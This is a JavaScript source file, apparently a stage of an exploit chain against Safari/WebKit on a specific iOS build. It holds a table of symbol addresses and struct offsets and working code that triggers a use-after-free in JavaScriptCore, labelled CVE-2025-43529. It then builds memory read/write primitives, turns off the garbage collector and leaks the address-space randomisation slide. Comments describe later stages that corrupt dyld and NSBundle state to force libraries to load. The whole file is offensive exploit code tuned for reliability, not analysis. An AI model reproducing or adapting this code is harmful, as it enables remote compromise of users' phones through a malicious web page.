            "AXCoreUtilities__DefaultLoader": 0x1ed5a8748n,
            "CFNetwork__gConstantCFStringValueTable": 0x1ee5a9570n,
            "CMPhoto__kCMPhotoTranscodeOption_Strips": 0x1e77a3028n,
            // CMPhoto interpose replacees for check_dlopen2/stage6 (resolved for 23B85 via dsc symaddr 2026-07-11; cache validated against known offsets)
            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt": 0x1a5a87078n,
            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage": 0x1a5a87228n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage": 0x1a5a4a570n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1a5a4ab94n,
            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata": 0x1a5a4b2a8n,
            "CMPhoto__CMPhotoCompressionSessionAddExif": 0x1a5a4ace0n,
            "CoreServices__OBJC_CLASS__LSApplicationRestrictionsManager": 0x1ed443e08n, // wake fallback: plain -init -> dlopen(ManagedConfiguration), no NSBundle (round2)
            "CoreServices__LSARM_guard": 0x1ed445110n, // !=0 means LSARM already initialized (target spent)
            "emptyString": 0x1ed794420n,
            "Foundation__NSBundleTables_bundleTables_value": 0x1ed43f9d0n,  // +[__NSBundleTables bundleTables] singleton slot (disasm @0x180777f68; was 0x1ed43ee48 via stale extract_offset)
            "free_slabs": 0x1ed4e4e30n,
            "GameController__OBJC_CLASS__GCEventInteraction": 0x1edecf130n, // wake target 2: +initialize -> NSBundle(GameControllerUI).load, own lock (deferred-loader-pairs.md (b1)); prereq GameController.framework
            "GPUProcess_singleton": 0x1eb01db60n,
            "ImageIO__gFunc_CMPhotoCompressionCreateContainerFromImageExt": 0x1ed5697b0n,
            "ImageIO__gFunc_CMPhotoCompressionCreateDataContainerFromImage": 0x1ed5697a8n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImage": 0x1ed569738n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation": 0x1ed569730n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddCustomMetadata": 0x1ed5693b8n,
            "ImageIO__gFunc_CMPhotoCompressionSessionAddExif": 0x1ed569728n,
            "ImageIO__gImageIOLogProc": 0x1ee39b008n,
            "libdyld__gAPIs": 0x1ed0b4010n,
            "libsystem_c__atexit_mutex": 0x1ed3f0b60n,
            "libsystem_c__cxa_atexit": 0x18e920ba0n,   // [park-gate needle] worker1's parked stack contains __cxa_atexit+0x28 (lldb thread #5 frame #4) -- scan-for-park instead of the broken 26.1 count-poll
            "mach_task_self_ptr": 0x280a64078n,
            "mainRunLoop": 0x1ed7ac020n,
            "NSConcreteMapTable_countOff": 0x1ed42f2bcn, // ldrsw ivar-offset globals (layout from getKeys:values: disasm, bundleWithPath-and-round2.md)
            "NSConcreteMapTable_keysOff": 0x1ed42f2c0n,
            "NSConcreteMapTable_valuesOff": 0x1ed42f2c4n,
            "PassKitCore__OBJC_CLASS__PKContact": 0x1ed6d0e90n, // (23B85 objc class-opt list; format validated vs AVSpeechSynthesisVoice=0x1ed744f08). NOTE: useless as a wake trigger -- loadObjcClass only rides the AVFAudio->TextToSpeech deferred loader, so planting a non-AVFAudio class loads NOTHING (proven by run 014753: 4 loads, zero atexit activity). Kept for stage6's PKContact patch.
            "pthread_create": 0x1df150ee8n,
            "runLoopHolder_tid": 0x1ed7bcd08n,
            "Security__gSecurityd": 0x1ea91d500n,
            "TextToSpeech__OBJC_CLASS__TtC12TextToSpeech27TTSMagicFirstPartyAudioUnit": 0x1ed96f348n,
            "UIKitCore__OBJC_CLASS__UIManagedDocument": 0x1ee3f9980n, // wake target 1: +initialize -> dlopen(CoreData) direct, NO NSBundle/lock (deferred-loader-pairs.md (b2)); UIKitCore always in WebContent, CoreData not at boot
            "CoreML__OBJC_CLASS___MLSNFrameworkHandle": 0x1ee57da68n, // wake target 0: -init -> dlopen(SoundAnalysis) direct in init (deferred-loader-pairs.md (c)); WebNN-only family = almost surely NOT resident on any device
            "CoreML__OBJC_CLASS___MLVNFrameworkHandle": 0x1ee57d9a0n, // wake target 0b: -init -> dlopen(Vision) (deferred-loader-pairs.md (c))
            "CoreML__OBJC_CLASS___MLNLPFrameworkHandle": 0x1ee57f4a8n, // wake target 0c: -init -> dlopen(NaturalLanguage) (deferred-loader-pairs.md (c))
            "WebCore__PAL_getPKContactClass": 0x1ed61cff8n,
            "WebCore__softLinkDDDFACacheCreateFromFramework": 0x1ed624310n,
            "WebCore__softLinkDDDFAScannerFirstResultInUnicharArray": 0x1ed6238b0n,
            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetDisplayType": 0x1ed6238a0n,
            "WebCore__softLinkOTSVGOTSVGTableRelease": 0x1ee638020n,
            "WebCore__ZZN7WebCoreL29allScriptExecutionContextsMapEvE8contexts": 0x1eb03ec80n,
            "libARI_cstring": 0x2958de820n,
            "libGPUCompilerImplLazy_cstring": 0x24c060870n,
            "libGPUCompilerImplLazy__invoker": 0x24cc2fb90n, // the invoker THUNK on 23B85 (pacibsp; ldp x8,x0,[x0]; blraaz x8; mov w0,#0; retab) -- NOT 0x24cf168b4 (mid-function garbage)
            "libsystem_pthread_base": 0x1df14d000n,
            "pthread_linkedit": 0x1ffd24000n,
            "PerfPowerServicesReader_cstring": 0x25e025e60n,
            "AVFAudio__cfstr_SystemLibraryTextToSpeech": 0x1f3850990n,
            "dyld__RuntimeState_vtable": 0x1eee9ed38n, // 23B85: __ZTVN5dyld412RuntimeStateE (was stale 0x1eee9f700)
            "JavaScriptCore__jitAllowList": 0x1ed7bea70n,
            "JavaScriptCore__jitAllowList_once": 0x1ed7be888n,
            "RemoteGraphicsContextGLWorkQueue": 0x1ed642298n,
            "WebCore__DedicatedWorkerGlobalScope_vtable": 0x1f141dec8n, //offset finder got this incorrect but this is the manually verified correct addr 
            "WebCore__initPKContact_once": 0x1ed625138n,
            "WebCore__initPKContact_value": 0x1ed625140n,
            "WebCore__TelephoneNumberDetector_phoneNumbersScanner_value": 0x1eb084030n,
            // 23B85 disasm-verified (TelephoneNumberDetector::find 0x1a1059f80 + init lambda 0x1a105d2f4):
            // the scanner OBJECT global find() passes to the DDDFA slot, its std::call_once guard
            // (-1 = ready), and the isSupported byte (1 = skip the zeroing path).
            "WebCore__TND_scannerObject": 0x1eb083f78n,
            "WebCore__TND_scannerOnce": 0x1eb083f80n,
            "WebCore__TND_supportedFlag": 0x1eb083f10n,
            "WebCore__HTMLDocument_vtable": 0x1f1367550n, // RUNTIME-verified (real-device contexts walk 2026-08-02): ScriptExecutionContext-in-HTMLDocument SECONDARY address point (__ZTVN7WebCore12HTMLDocumentE 0x1f13671e0 + 0x370). The map stores the SEC subobject pointer (Document+0xd0; vtable offset-to-top at sym+0x360 = -0xd0), so ctx+0 holds this value, NOT the primary address point.
            "DesktopServicesPriv_bss": 0x1ecff4080n,
            "GetCurrentThreadTLSIndex_CurrentThreadIndex": 0x280c6e460n,
            "pthread_create_jsc": 0x1998f5688n,
            "libsystem_kernel__thread_suspend": 0x22ca45238n,
            "libdyld__dlopen": 0x1800e8350n,
            "libdyld__dlsym": 0x1800e8444n,
            "jsc_base": 0x197f59000n,
            "dyld__dlopen_from_lambda_ret": 0x18013a89cn, // ret into APIs::dlopen_from after the load-lambda(0x1801533b4) call; 3 sites 0x18013a89c/0x18013a944/0x18013a980 - primary=first, confirm on-device which is on the parked stack (was stale 0x18011cfc8=aligned_alloc+184)
            "dyld__signPointer": 0x1801464c0n, // 23B85 free fn signPointer(u64,void*,bool,u16,ptrauth_key) @ nm extracted/dyld; 18.6's ChainedFixupPointerOnDisk::Arm64e::signPointer is 0x18011e210 here but with a DIFFERENT signature than 18.6's -- slow_pacia's (self,ctx,ptr) convention matches NEITHER directly; adapt before slow_pacia/JOP use. NOT needed for the slow_dlopen/dlsym self-test.
            "dyld__RuntimeState_emptySlot": 0x180162658n, // RuntimeState::emptySlot() = vtable[0] (read from __ZTVN5dyld412RuntimeStateE+0x10; was stale 0x18015eb6c=decDlRefCount+632)
            "WebProcess_ensureGPUProcessConnection": 0x19e16f334n,
            "WebProcess_gpuProcessConnectionClosed": 0x19e16f628n,
            "Security__SecKeychainBackupSyncable_block_invoke": 0x1888d9b94n,
            "Security__SecOTRSessionProcessPacketRemote_block_invoke": 0x1888ee884n,
            "MediaAccessibility__MACaptionAppearanceGetDisplayType": 0x1b021f5c0n,
            "MediaAccessibility__MACaptionAppearanceGetTextEdgeStyle": 0x1b0221960n, // the caption-BATTERY function (called by captionsStyleSheetOverride on 26.1; GetDisplayType is gated by Manual mode and never fires)
            "WebCore__softLinkMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle": 0x1ee638648n, // ipsw dyld softlinks: init-fn 0x1a1056008
            "WebCore__initMediaAccessibilityMACaptionAppearanceGetTextEdgeStyle_once": 0x1eb083d48n,
            "JavaScriptCore__globalFuncParseFloat": 0x1991abde8n,
            "HOMEUI_cstring": 0x1834dbfa1n,
            "ImageIO__IIOLoadCMPhotoSymbols": 0x185e73768n,
            "CMPhoto__CMPhotoCompressionCreateContainerFromImageExt_func": 0x1a5a87078n,
            "CMPhoto__CMPhotoCompressionCreateDataContainerFromImage_func": 0x1a5a87228n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImage_func": 0x1a5a4a570n,
            "CMPhoto__CMPhotoCompressionSessionAddAuxiliaryImageFromDictionaryRepresentation_func": 0x1a5a4ab94n,
            "CMPhoto__CMPhotoCompressionSessionAddCustomMetadata_func": 0x1a5a4b2a8n,
            "CMPhoto__CMPhotoCompressionSessionAddExif_func": 0x1a5a4ace0n,
        },
        structs: {
            // --- GC disable (disableGC) ---
            GlobalObject_toVM_a: 0x10n,   // addrof(globalThis)+0x10 -> intermediate
            GlobalObject_toVM_b: 0x38n,   // intermediate+0x38       -> JSC::VM*
            VM_heap: 0xc0n,   // offsetof(JSC::VM, heap)
            Heap_isSafeToCollect: 0x259n,  // offsetof(JSC::Heap, m_isSafeToCollect)
            // --- ASLR slide leak (parseFloat native fn) ---
            JSFunction_executable: 0x18n,   // JSFunction::m_executableOrRareData
            NativeExecutable_function: 0x28n,   // NativeExecutable::m_function (noPAC)
            // --- worker forward chain (ctx -> JS globalScope), from 23B85 WebCore disasm ---
            WorkerGlobalScope_script: 0x160n,  // WorkerOrWorkletGlobalScope::m_script
            ScriptController_wrapper: 0x20n,   // WorkerOrWorkletScriptController::m_globalScopeWrapper (Strong slot -> deref)
            WorkerGlobalScope_thread: 0x170n,  // WorkerOrWorkletGlobalScope::m_thread = ThreadSafeWeakPtr.m_objectOfCorrectType (TaggedPtr, +0 of the weak ptr) -> WorkerOrWorkletThread* (mask tag w/ noPAC)
            WorkerThread_wtfThread: 0x28n,     // WorkerOrWorkletThread::m_thread -> WTF::Thread (start() disasm: str x8,[this,#0x28]; == DarkSword)
            // --- allScriptExecutionContextsMap walk (stage3) ---
            ContextsMap_stride: 0x30n,   // sizeof(HashMap bucket)
            ContextsMap_value: 0x20n,   // bucket -> ScriptExecutionContext*
            // --- stage7 telephone-scan gate (Document::isTelephoneNumberParsingEnabled, 23B85 disasm 0x1a058cdac) ---
            Document_settings: 0x2d0n,                 // Document.m_settings -> Settings*
            Settings_telephoneParsing: 0x2d2n,         // Settings byte, bit 0x8 = telephoneNumberParsingEnabled (embedder pref, default FALSE)
            Document_telephoneParsingAllowed: 0xe0cn,  // Document.m_isTelephoneNumberParsingAllowed byte, bit 0x1
            Document_secSubobjectOffset: 0xd0n,        // contexts-map value = Document+0xd0 (the ScriptExecutionContext subobject); Document* = ctx - 0xd0
            // --- stage4: AXCoreUtilities DefaultLoader dispatch chain (Part A, disarm callback) ---
            //     [LIVE] validate via the defaultLoader/dispatchSource/dispatchBlock logs
            DefaultLoader_dispatchSource: 0x18n,
            DispatchSource_inner: 0x58n,
            DispatchInner_block: 0x28n,
            DispatchBlock_invoke: 0x20n,   // [write] block invoke fn-ptr <- paciza_nullfunc
            // --- stage4: ImageBitmap -> image buffer (Parts B/C + loadObjcClass) ---
            //     [LIVE] validate via wrappedBitmap/imageBuffer logs (IOSurface internals)
            JSImageBitmap_wrapped: 0x18n,  // addrof(bitmap)+0x18 -> C++ ImageBitmap
            ImageBitmap_buffer: 0x10n,     // ImageBitmap -> image buffer
            ImageBuffer_objcClass: 0x20n,  // [write] planted ObjC Class*
            // --- stage4: NSBundleTables / loadedFrameworks walk (CONFIRMED via class-dump 23B85) ---
            NSBundleTables_loadedFrameworks: 0x20n,  // __NSBundleTables._loadedFrameworks (NSConcreteHashTable)
            LoadedFrameworks_count: 0x30n,           // NSConcreteHashTable.capacity (iteration bound; slots are sparse)
            LoadedFrameworks_buffer: 0x08n,          // NSConcreteHashTable.slice.items (void** backing)
            // --- stage4: NSBundle ivars (CONFIRMED via class-dump, unchanged 23B85) ---
            NSBundle_flags: 0x08n,        // [write 0x40008] _flags
            NSBundle_cfBundle: 0x10n,     // _cfBundle
            NSBundle_initialPath: 0x28n,  // _initialPath (compared vs cfstr ".../TextToSpeech")
            NSBundle_lock: 0x40n,         // [stage5 write 0]  _lock (os_unfair_lock; cleared so the bundle re-resolves) -- ivar layout: _resolvedPath@0x30, _firstClassName@0x38, _lock@0x40
            // --- stage4: CFBundle internals (CoreFoundation, opaque struct) ---
            CFBundle_loadedFlag: 0x34n,   // [write8 0]  [LIVE via libARI load]
            CFBundle_execPath: 0x68n,     // [write] exec path -> forged CFString
            // --- stage4: forged CFString (CONFIRMED canonical __CFString layout) ---
            CFString_dataPtr: 0x10n,      // [write] char* -> libARI path
            CFString_length: 0x18n,       // [write] length (0x15)
            // --- stage4: libsystem_c atexit mutex guard ---
            Atexit_mutexState: 0x20n,     // [write 0x102]
            // --- stage5: dyld4::RuntimeState internals (dyld in shared cache) ---
            RuntimeState_lock: 0x70n,         // RuntimeState -> _locks (runtimeStateLock)   [verify]
            RuntimeStateLock_word: 0x0n,      // zero the dlopen-lock GUARD at *(RuntimeLocks+0). Confirmed via 23B85 disasm: BOTH takeDlopenLockBeforeFork@0x18015335c AND releaseDlopenLockInForkParent@0x180156ee0 do `ldr x0,[this]; cbz x0,ret` on +0, and NEITHER writes +0 (persistent init-set pointer -> our zero holds). guard=0 => the main wake-load NEVER acquires the lock AND worker1's finalize+main both skip releaseDlopenLockInForkParent's os_unfair_lock_unlock(+0x20) -> no cross-thread unlock -> no 26.1 os_unfair_lock abort. Zeroing +0x20 (the lock word) instead leaves the guard set, so release runs os_unfair_lock_unlock on a value=0 lock -> EXC_BREAKPOINT abort (the crash 2026-07-14). MUST be 0x0, NOT 0x20.
            RuntimeState_interposeBuf: 0xb8n, // RuntimeState._interposingTuplesAll buffer    [verify]
            RuntimeState_interposeSize: 0xc0n,// RuntimeState._interposingTuplesAll size      [verify]
            // --- stage5: WTF::Thread stack bounds (CONFIRMED: m_stack@0x10 = vtable@0+refcount@8; StackBounds{m_origin@0,m_bound@8}) ---
            Thread_stackBottom: 0x10n,        // WTF::Thread.m_stack.m_origin (high addr)
            Thread_stackTop: 0x18n,           // WTF::Thread.m_stack.m_bound  (low addr)
            StackFrame_loader: 0x78n,         // dlopen frame -> parked dyld Loader* [verify]
            // --- stage5: fake StringImpl for efficient_search (mirrors stage1 read primitive) ---
            StringImpl_flags: 0x1000n,        // 8-bit buffer flag OR'd with (length<<32)
            StringImpl_data: 0x08n,           // StringImpl m_data (char* buffer)
        },
    },
};

const TARGET_BUILD = "23B85";
const offsets = VERSIONS[TARGET_BUILD].syms;
const structs = VERSIONS[TARGET_BUILD].structs;
p.offsets = offsets;
p.structs = structs;

function signed32(v) {
    v &= 0xffffffffn;
    if (v >= 0x80000000n) return Number(v - 0x100000000n);
    return Number(v);
}

function plausiblePointer(ptr) {
    return typeof ptr === "bigint" &&
        ptr >= 0x100000000n &&
        ptr < 0x0001000000000000n &&
        (ptr & 0x7n) === 0n;
}

// ---------------------------------------------------------------------
//  Stage 1a: the CVE-2025-43529 GC-race UAF + reclaim -> addrof / fakeobj
// ---------------------------------------------------------------------
const rootArray = new Array(0x40_0000).fill(1.1);
const rootIndex = rootArray.length - 1;
const reclaimed = [];

// Per-buffer size of the UAF spray. Tunable: raising it trips JSC's collection threshold in
// fewer iterations but overshoots harder (higher peak RSS -> Safari's memory-pressure tab
// reload); lowering it costs iterations. Original value was 0x80_0000 (8MB).
const UAF_SPRAY_UNIT = 0x10_0000;   // 1MB (was 0x80_0000 = 8MB)

function triggerUAF(flag, k, allocCount) {
    const A = { p0: 0x41414141, p1: 1.1, p2: 2.2 };
    rootArray[rootIndex] = A;

    const forGC = [];
    const a = new Date(1111);
    a[0] = 1.1;

    // SPRAY GRANULARITY (2026-08-01): was a hardcoded 0x80_0000 (8MB) per buffer. The buffers
    // exist to push JSC's allocated-bytes counter over its collection threshold so the GC runs
    // inside the race window -- the SIZE is a means to that, not a requirement. At 8MB the
    // counter moves in huge steps, so each iteration overshoots by up to 40MB before the GC
    // gets a decision point, and whatever has not been reclaimed when stage1 switches the GC
    // off is pinned for the rest of the run. Measured peak footprint was ~597-776MB, and the
    // resulting memory-pressure tab reload reaps 17 of 20 runs during stage6 (see
    // reliability/FINDINGS.md). Same total pressure at finer granularity should trip the
    // threshold at a lower peak.
    for (let j = 0; j < allocCount; ++j) {
        forGC.push(new ArrayBuffer(UAF_SPRAY_UNIT));
    }

    A.p2 = forGC;
    const b = { p0: 0x42424242, p1: 1.1 };

    let f = b;
    if (flag) f = 1.1;

    A.p1 = f;

    let v = 1.1;
    for (let i = 0; i < 1e6; ++i) {
        for (let j = 0; j < k; ++j) {
            v = i;
            v = j;
        }
    }

    b.p0 = v;
    b.p1 = a;
}

function recursive(n) {
    if (n === 0) return;
    recursive((n | 0) - 1);
}

function safeRecursive(n) {
    try { recursive(n); } catch (e) { }
}

// Drive the UAF and reclaim the freed cell with a controllable array, giving
// the classic float/object type-confusion pair -> addrof / fakeobj.
// Returns { addrof, fakeobj } on success, or null if reclaim never landed.
async function acquireRW() {
    triggerUAF(true, 1, 1);
    triggerUAF(false, 1, 1);
    for (let i = 0; i < 1000; ++i) triggerUAF(false, 0, 0);
    for (let i = 0; i < 20; ++i) safeRecursive(800);

    let lastProgress = Date.now();
    for (let k = 0; k < 15000; ++k) {
        triggerUAF(false, 10, (k % 5) + 1);
        safeRecursive(800);
        for (let i = 0; i < 3; ++i) new ArrayBuffer(0x4000);

        let freed;
        try {
            freed = rootArray[rootIndex].p1.p1;
        } catch (e) {
            continue;
        }

        let winningArray = null;
        const noCow = 13.37;
        for (let i = 0; i < 64; ++i) {
            const spray = [13.37, 2.2, 3.3, 4.4, noCow];
            reclaimed.push(spray);
            try {
                if (freed[0] === 13.37) {
                    winningArray = spray;
                    break;
                }
            } catch (e) { }
        }

        if (!winningArray) {
            if ((Date.now() - lastProgress) > 1500) {
                postMessage(`attempt ${k}/15000; reclaimed arrays=${reclaimed.length}`);
                lastProgress = Date.now();
                await new Promise(r => setTimeout(r, 1));
            }
            continue;
        }

        // boxedArray reads JSValues, unboxedArray (the freed cell) reads raw floats:
        // write an object to boxedArray[0] -> read its pointer as a float from
        // unboxedArray[0], and vice versa.
        const boxedArray = winningArray;
        boxedArray[0] = {};
        const unboxedArray = freed;
        self[0] = unboxedArray;   // keep both alive as indexed globals
        self[1] = boxedArray;

        const addrof = (obj) => { boxedArray[0] = obj; return ftoi(unboxedArray[0]); };
        const fakeobj = (addr) => { unboxedArray[0] = itof(addr); return boxedArray[0]; };
        return { addrof, fakeobj };
    }
    return null;
}

// ---------------------------------------------------------------------
//  Stage 1b: DarkSword "scribble" -> arbitrary read64 / write64
//  Installs p.read64 / p.write64 / p.read32 / p.write8 / p.write16.
//  Those closures capture the underlying scribble objects, so storing them
//  in `p` keeps the whole primitive alive for every later stage / message.
// ---------------------------------------------------------------------
function buildScribbleRW(addrof, fakeobj) {
    const read64BigUint64 = new BigUint64Array(4);
    const read64Str = "䑄".repeat(0x10);
    void [][read64Str];

    // 1) find a JSObject sitting exactly 0x20 after a previous one.
    let scribbleElement = null;
    let prevAddr = 0n;
    const keepAlive = [];
    for (let i = 0; i < 1000; ++i) {
        const o = { p1: 1.1, p2: 2.2 };
        const addr = addrof(o);
        if (addr - prevAddr === 0x20n) {
            scribbleElement = o;
            break;
        }
        keepAlive.push(o);
        prevAddr = addr;
    }
    if (!scribbleElement) return false;

    // 2) overlay a fake DoubleArray on the holder's inline slots; p1 becomes the
    //    fake cell header, p2 (= scribbleElement) becomes its butterfly.
    const changeScribbleHolder = {
        p1: fakeobj(0x108240700000000n), // placeholder header: ArrayWithDouble, structureID 0 (ok for the read fast path)
        p2: scribbleElement
    };
    const changeScribble = fakeobj(addrof(changeScribbleHolder) + 0x10n);

    scribbleElement.p3 = 1.1;
    scribbleElement[0] = 1.1;            // promote scribbleElement to ArrayWithDouble

    // harvest a *valid* DoubleArray cell header (real structureID) and reuse it
    const doubleArrayCell = ftoi(changeScribble[0]);
    changeScribbleHolder.p1 = fakeobj(doubleArrayCell);
    const originalCell = changeScribble[0];

    // 3) write64: aim changeScribble's butterfly at the target via scribbleElement.p3
    const write64 = function (addr, value) {
        addr = BigInt.asUintN(64, addr);
        value = BigInt.asUintN(64, value);

        changeScribble[0] = originalCell;
        changeScribble[1] = itof(addr + 0x10n);

        if (value === 0n) {
            scribbleElement.p3 = 1;
            delete scribbleElement.p3;
        } else if ((value >= 0x2000000000000n && value <= 0x7ff2000000000000n) ||
            (value >= 0x8002000000000000n && value <= 0xfff0000000000000n)) {
            scribbleElement.p3 = itof(value - 0x2000000000000n);
        } else {
            // split 32-bit write. Handles both small values (< 0x2000000000000, which used to go
            // through fakeobj) and non-double-encodable large values. fakeobj is broken after
            // stage4's close()/park (same as addrof), so we must never route through it here.
            const offAddr = addr + 8n;
            const offVal = read64(offAddr);
            const lo = signed32(value);
            const hi = signed32(value >> 32n);
            scribbleElement.p3 = lo;
            changeScribble[1] = itof(addr + 0x14n);
            scribbleElement.p3 = hi;
            write64(offAddr, offVal);
        }
    };

    // 4) read64: a fake JSString window over a BigUint64Array; charCodeAt reads target
    changeScribble[1] = itof(addrof(read64BigUint64) + 8n);
    const read64Float64Bytes = ftoi(scribbleElement[1]);
    read64BigUint64[0] = 0x10000000006n;
    read64BigUint64[1] = read64Float64Bytes + 0x10n;

    changeScribble[1] = itof(addrof(read64Str) + 8n);
    scribbleElement[0] = itof(read64Float64Bytes);

    const read64 = function (addr) {
        read64BigUint64[1] = BigInt.asUintN(64, addr);
        return BigInt(read64Str.charCodeAt(0)) |
            (BigInt(read64Str.charCodeAt(1)) << 16n) |
            (BigInt(read64Str.charCodeAt(2)) << 32n) |
            (BigInt(read64Str.charCodeAt(3)) << 48n);
    };

    const read32 = function (addr) {
        read64BigUint64[1] = BigInt.asUintN(64, addr);
        return BigInt(read64Str.charCodeAt(0)) | (BigInt(read64Str.charCodeAt(1)) << 16n);
    };

    const write8 = function (ptr, b) {
        let value = read64(ptr);
        value &= ~0xffn;
        value |= b;
        write64(ptr, value);
    };

    const write16 = function (ptr, h) {
        let value = read64(ptr);
        value &= ~0xffffn;
        value |= h;
        write64(ptr, value);
    };

    // Rebuild addrof/fakeobj on top of read64/write64 so they survive stage4's close()/park (which
    // reclaims the UAF's dangling cell and breaks the ORIGINAL addrof/fakeobj). holderObj is a normal
    // LIVE object (GC-safe, real structure) -- not a dangling alias. `pad` (a large double) sits in the
    // slot right after `x`, so write64's split-write of a small pointer into x's slot restores pad in
    // ONE double-encoded step (no unbounded recursion). We locate x's inline slot by planting a marker.
    const holderObj = { x: null, pad: 1.3e300 };
    p.holderObj = holderObj;
    const _marker = {};
    holderObj.x = _marker;
    const _markerAddr = addrof(_marker);
    let xSlot = 0n;
    for (let off = 0x10n; off <= 0x30n; off += 8n) {
        if (read64(addrof(holderObj) + off) === _markerAddr) { xSlot = addrof(holderObj) + off; break; }
    }
    holderObj.x = null;
    p.xSlot = xSlot;
    p.addrofRW = (obj) => { holderObj.x = obj; return read64(xSlot); };
    p.fakeobjRW = (addr) => { write64(xSlot, addr); return holderObj.x; };
    p.rwRebuildOk = (xSlot !== 0n) &&
        (p.addrofRW(_marker) === _markerAddr) &&
        (p.fakeobjRW(_markerAddr) === _marker);
    holderObj.x = null;

    p.read64 = read64;
    p.read32 = read32;
    p.write64 = write64;
    p.write8 = write8;
    p.write16 = write16;

    p.write32le = (addr, v32) => {           // 32-bit store via two 16-bit writes — never touches the neighbor word
        v32 = BigInt(v32);
        p.write16(addr, v32 & 0xffffn);
        p.write16(addr + 2n, (v32 >> 16n) & 0xffffn);
    };

    // read64 re-linker: a heavy dlopen (libGPUCompilerImplLazy in stage6) clobbers read64Str's
    // overwritten StringImpl->backing linkage, after which every read64 returns a stale constant
    // (0x9) and write64(small) recurses to death. The scribble (write path) survives, so re-point
    // read64Str at read64BigUint64's CURRENT backing through the scribble. addrof is captured NOW
    // (GC off -> the cells don't move) so the re-linker needs no working read64/addrof. Call after
    // any framework load (see loadObjcClass).
    p.read64Str_addr = addrof(read64Str);
    p.read64BigUint64_addr = addrof(read64BigUint64);
    p.reestablishRead64 = function () {
        // relink diagnostic slogs THROTTLED (2026-07-22): thousands of per-relink XHRs per attempt
        // churned the worker+server right at the fire window (jetsam/WatchdogTimer reloads were
        // the dominant attempt killer -- 78 fires / 22 CAS / 0 timeouts = killed mid-spin, not a
        // mechanics failure). Log one in every 64 relinks; kill with p.relinkVerbose = false.
        const __n = (p.__relinkN = (p.__relinkN || 0) + 1);
        if ((__n & 0x3f) === 0) slog(`[relink] #${__n}`);
        changeScribble[1] = itof(p.read64BigUint64_addr + 8n);
        const rf = ftoi(scribbleElement[1]);
        read64BigUint64[0] = 0x10000000006n;
        read64BigUint64[1] = rf + 0x10n;
        changeScribble[1] = itof(p.read64Str_addr + 8n);
        scribbleElement[0] = itof(rf);
    };
    return true;
}

// ---------------------------------------------------------------------
//  Stage 2: neutralize JSC defenses, leak the slide, locate the workers.
//  Built entirely on p.read64 / p.write64 from stage 1.
// ---------------------------------------------------------------------
// Self-test the primitives before stage 1 hands off: cross-check addrof/fakeobj/
// read64/write64 against ground truth (a TypedArray's own backing store) and confirm
// read64 can pull a real shared-cache pointer. If any of these fail, R/W is wrong and
// the slide leak would march the jsc_base scan off into unmapped memory.

function sanityCheckRW() {
    const { addrof, fakeobj, read64, write64 } = p;
    const fail = (m) => { postMessage("[assert] FAIL: " + m); return false; };

    // addrof returns a plausible, aligned heap pointer
    const probe = { marker: 1.1 };
    const a = addrof(probe);
    if (!plausiblePointer(a)) return fail(`addrof implausible: ${hex(a)}`);

    // addrof / fakeobj are inverse
    if (fakeobj(a) !== probe) return fail("fakeobj(addrof(o)) !== o");

    // read64 / write64 cross-checked vs a TypedArray's own backing store (known, mapped)
    const t = new BigUint64Array(8);
    const td = read64(addrof(t) + 0x10n);            // m_vector (data pointer)
    if (!plausiblePointer(td)) return fail(`typedarray backing implausible: ${hex(td)}`);
    t[0] = 0x4142434445464748n;                       // JS writes -> read64 must see it
    if (read64(td) !== 0x4142434445464748n) return fail(`read64 != JS write: ${hex(read64(td))}`);
    write64(td + 8n, 0xcafef00dd00dfeedn);            // write64 writes -> JS must see it
    if (t[1] !== 0xcafef00dd00dfeedn) return fail(`write64 != JS read: ${hex(t[1])}`);
    t[2] = 0xffffffffffffffffn;                       // catch 16/32-bit truncation in read64
    if (read64(td + 0x10n) !== 0xffffffffffffffffn) return fail(`read64 truncates high bits: ${hex(read64(td + 0x10n))}`);

    // cache read: parseFloat -> m_executable -> NativeExecutable.m_function
    // must land inside the dyld shared cache, or the slide leak / jsc_base scan is doomed.
    const executable = read64(addrof(parseFloat) + structs.JSFunction_executable);
    if (!plausiblePointer(executable)) return fail(`parseFloat executable implausible: ${hex(executable)}`);
    const fn = noPAC(read64(executable + structs.NativeExecutable_function));
    if (fn < 0x180000000n || fn >= 0x400000000n) return fail(`parseFloat native ptr not in shared cache: ${hex(fn)} (exec ${hex(executable)})`);

    postMessage(`[assert] R/W OK  (parseFloat native = ${hex(fn)})`);
    return true;
}

// Disable the GC (Heap::m_isSafeToCollect = 0) so the fake scribble cells built in
// stage 1 are never visited by the collector. MUST run in the same synchronous span
// as buildScribbleRW -- before we yield to the event loop, otherwise a collection in
// the gap marks a fake cell -> JSObject::visitChildren crash.
function disableGC() {
    const { read64, write8, addrof } = p;
    // globalThis -> VM -> Heap; offsets decoded from the 23B85 JavaScriptCore binary.
    const vm = read64(read64(addrof(globalThis) + structs.GlobalObject_toVM_a) + structs.GlobalObject_toVM_b);
    const heap = vm + structs.VM_heap;
    const isSafeToCollect = heap + structs.Heap_isSafeToCollect;
    p.vm = vm;
    p.heap = heap;
    write8(isSafeToCollect, 0n);
    postMessage(`[GC] m_isSafeToCollect(${hex(isSafeToCollect)}) = 0  (vm ${hex(vm)})`);
}

function enableGC() {
    const { read64, write8, addrof } = p;
    // globalThis -> VM -> Heap; offsets decoded from the 23B85 JavaScriptCore binary.
    const vm = read64(read64(addrof(globalThis) + structs.GlobalObject_toVM_a) + structs.GlobalObject_toVM_b);
    const heap = vm + structs.VM_heap;
    const isSafeToCollect = heap + structs.Heap_isSafeToCollect;
    p.vm = vm;
    p.heap = heap;
    write8(isSafeToCollect, 1n);
    postMessage(`[GC] m_isSafeToCollect(${hex(isSafeToCollect)}) = 0  (vm ${hex(vm)})`);
}
async function stage2() {
    const { read64, read32, write64, addrof } = p;

    // --- leak the JSC slide via parseFloat's native implementation ---
    // JSFunction.m_executableOrRareData -> NativeExecutable.m_function
    const executable = read64(addrof(parseFloat) + structs.JSFunction_executable);
